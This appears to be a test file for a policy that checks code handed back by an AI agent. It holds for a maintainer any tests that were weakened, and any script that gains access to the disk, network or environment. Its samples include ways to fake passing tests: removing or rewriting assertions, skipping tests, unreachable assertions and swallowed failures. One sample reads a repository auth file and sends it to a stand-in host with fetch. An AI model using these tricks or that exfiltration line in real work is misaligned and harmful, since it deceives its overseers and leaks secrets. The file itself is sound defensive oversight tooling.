/**
 * The hand-off policy on a test the slice was handed: an assertion removed
 * or rewritten, or a test skipped, is held for the maintainer.
 */

import assert from "node:assert/strict";
import { test } from "node:test";
import { gainedReach, handoffPolicy, reachOf, weakenedTest } from "../src/policy.js";

const TEST = [
  'import assert from "node:assert/strict";',
  'import { test } from "node:test";',
  'import { price } from "../src/price.js";',
  'test("prices", () => {',
  "  assert.equal(price(1), 4);",
  "  assert.equal(",
  "    price(2),",
  "    8,",
  "  );",
  "});",
  "",
].join("\n");

test("a test bent to pass is held for the maintainer; one only added to passes", () => {
  const path = "pkg/test/price.test.ts";
  assert.equal(weakenedTest(path, TEST, TEST), null);
  // An assertion added, the others kept: a stronger test.
  assert.equal(weakenedTest(path, TEST, TEST.replace("});", "  assert.equal(price(0), 0);\n});")), null);
  // Formatting alone changes nothing.
  assert.equal(weakenedTest(path, TEST, TEST.replace("  assert.equal(\n    price(2),\n    8,\n  );", "  assert.equal(price(2), 8);")), null);
  assert.match(weakenedTest(path, TEST, TEST.replace("price(1), 4", "price(1), 3")) ?? "", /rewrites 1 assertion/);
  assert.match(weakenedTest(path, TEST, TEST.replace("    8,", "    6,")) ?? "", /rewrites 1 assertion/);
  assert.match(weakenedTest(path, TEST, TEST.replace("  assert.equal(price(1), 4);\n", "")) ?? "", /removes or rewrites 1 assertion/);
  assert.match(weakenedTest(path, TEST, TEST.replace('test("prices"', 'test.skip("prices"')) ?? "", /skips 1 more test/);
  assert.match(weakenedTest(path, TEST, TEST.replace('test("prices", ', 'test("prices", { skip: true }, ')) ?? "", /skips 1 more test/);
  // Vitest's expect, imported or global.
  const vitest = 'describe("p", () => { it("x", () => { expect(price(1)).toBe(4); }); });\n';
  assert.match(weakenedTest(path, vitest, vitest.replace("toBe(4)", "toBe(3)")) ?? "", /rewrites 1 assertion/);
});

test("an assertion that can no longer run counts as removed", () => {
  const path = "src/price.test.ts";
  const gutted = (from: string, to: string) => weakenedTest(path, TEST, TEST.replace(from, to)) ?? "";
  // Every assertion's text is still there, but none of it runs.
  assert.match(gutted('test("prices", () => {\n', 'test("prices", () => {\n  return;\n'), /removes or rewrites 2 assertions/);
  assert.match(gutted("  assert.equal(price(1), 4);\n", '  throw new Error("skip");\n  assert.equal(price(1), 4);\n'), /removes or rewrites 2 assertions/);
  assert.match(gutted("  assert.equal(price(1), 4);", "  if (false) assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  assert.match(gutted("  assert.equal(price(1), 4);", "  false && assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  // A branch that may run, and an early return after the assertions, pass.
  assert.equal(gutted("  assert.equal(price(1), 4);", "  if (process.env.X) assert.equal(price(1), 4);"), "");
  assert.equal(gutted("  assert.equal(price(1), 4);", "  if (true) assert.equal(price(1), 4);"), "");
  assert.equal(gutted("    8,\n  );\n", "    8,\n  );\n  return;\n"), "");
  // A failure swallowed by a catch that does not throw again.
  assert.match(gutted("  assert.equal(price(1), 4);", "  try { assert.equal(price(1), 4); } catch {}"), /removes or rewrites 1 assertion/);
  assert.equal(
    gutted("  assert.equal(price(1), 4);", "  try { assert.equal(price(1), 4); } catch (error) { log(error); throw error; }"),
    "",
  );
});

test("a script's reach beyond its own computation is read from its syntax", () => {
  const reach = (text: string) => reachOf("pkg/test/x.test.ts", text);
  // A test's ordinary imports reach nothing.
  assert.deepEqual(reach(TEST), []);
  assert.deepEqual(reach('import { setTimeout } from "node:timers/promises";\nimport { createHash } from "node:crypto";\n'), []);
  // The disk, the process, the network.
  assert.deepEqual(reach('import { readFileSync } from "node:fs";\n'), ["node:fs"]);
  assert.deepEqual(reach('import fs from "fs/promises";\n'), ["node:fs"]);
  assert.deepEqual(reach('const cp = require("child_process");\n'), ["node:child_process"]);
  assert.deepEqual(reach('const net = await import("node:net");\n'), ["node:net"]);
  assert.deepEqual(reach('import http = require("http");\n'), ["node:http"]);
  assert.deepEqual(reach('export { request } from "node:https";\n'), ["node:https"]);
  assert.deepEqual(reach('await fetch("https://example.test/" + secret);\n'), ["fetch"]);
  assert.deepEqual(reach("await globalThis.fetch(url);\n"), ["fetch"]);
  assert.deepEqual(reach('await globalThis["fetch"](url);\n'), ["fetch"]);
  assert.deepEqual(reach("const f = { fetch };\n"), ["fetch"]);
  assert.deepEqual(reach("new WebSocket(url);\n"), ["WebSocket"]);
  // The environment, and code run from text.
  assert.deepEqual(reach("const key = process.env.API_KEY;\n"), ["process.env"]);
  assert.deepEqual(reach('const key = process["env"].API_KEY;\n'), ["process.env"]);
  assert.deepEqual(reach("const key = import.meta.env.VITE_KEY;\n"), ["import.meta.env"]);
  assert.deepEqual(reach('eval("1");\nnew Function("return 1");\n'), ["Function", "eval"]);
  // Named by a computed value: could be any of the above.
  assert.deepEqual(reach("await import(name);\n"), ["a module named by a computed value"]);
  assert.deepEqual(reach('const m = require("node:" + "fs");\n'), ["a module named by a computed value"]);
  assert.deepEqual(reach('globalThis["fe" + "tch"](url);\n'), ["a global named by a computed value"]);
  assert.deepEqual(reach("process[key];\n"), ["a process member named by a computed value"]);
  // A service SDK.
  assert.deepEqual(reach('import { S3Client } from "@aws-sdk/client-s3";\n'), ["@aws-sdk/client-s3"]);
  // Members, types and type-only imports are not reads.
  assert.deepEqual(reach("client.fetch(1);\nconst o = { fetch: 1 };\nlet f: Function;\ntype F = typeof fetch;\n"), []);
  assert.deepEqual(reach('import type { Stats } from "node:fs";\nprocess.exitCode = 1;\n'), []);
});

test("a returned script that gains a reach is held; one that keeps its reach passes", () => {
  const path = "pkg/test/exfil.test.ts";
  const exfil = 'import { readFileSync } from "node:fs";\nawait fetch("https://x.test/?d=" + readFileSync("../../apps/api/src/auth.ts", "utf8"));\n';
  assert.deepEqual(gainedReach(path, null, exfil), ["fetch", "node:fs"]);
  // A module that read the disk before may keep doing so.
  const reader = 'import { readFileSync } from "node:fs";\nexport const load = (p: string) => readFileSync(p, "utf8");\n';
  assert.deepEqual(gainedReach("pkg/src/load.ts", reader, reader.replace('"utf8"', '"latin1"')), []);
  assert.deepEqual(gainedReach("pkg/src/load.ts", reader, `${reader}export const key = process.env.KEY;\n`), ["process.env"]);
  // Declarations and data run nothing.
  assert.deepEqual(gainedReach("pkg/src/x.d.ts", null, 'import "node:fs";\n'), []);
  assert.deepEqual(gainedReach("pkg/data.json", null, '{"fetch": 1}'), []);

  const judge = handoffPolicy({ reach: true });
  assert.match(judge(path, "added", { before: null, after: exfil }) ?? "", /reaches what it did not before \(fetch, node:fs\)/);
  assert.equal(judge(path, "added", { before: null, after: TEST }), null);
  // The maintainer, having read it, lets it through by path.
  assert.equal(handoffPolicy({ reach: true, allow: ["pkg/test/**"] })(path, "added", { before: null, after: exfil }), null);
  // Off unless asked: `gate` judges an agent in the repository, which may use the disk.
  assert.equal(handoffPolicy({})(path, "added", { before: null, after: exfil }), null);
});
